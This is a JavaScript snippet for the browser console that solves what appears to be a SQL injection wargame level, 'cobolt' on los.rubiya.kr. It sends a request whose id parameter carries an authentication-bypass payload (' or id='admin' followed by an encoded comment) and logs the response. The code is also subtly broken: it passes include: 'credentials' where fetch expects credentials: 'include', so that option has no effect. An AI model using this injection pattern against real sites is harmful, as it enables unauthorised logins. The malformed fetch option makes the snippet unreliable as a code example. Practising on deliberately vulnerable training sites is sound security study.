// On the chrome console window
fetch('https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=\'or id=\'admin\' %23',{
        include: 'credentials'
    }
).then((x) => x.text()).then((x) => console.log(x))
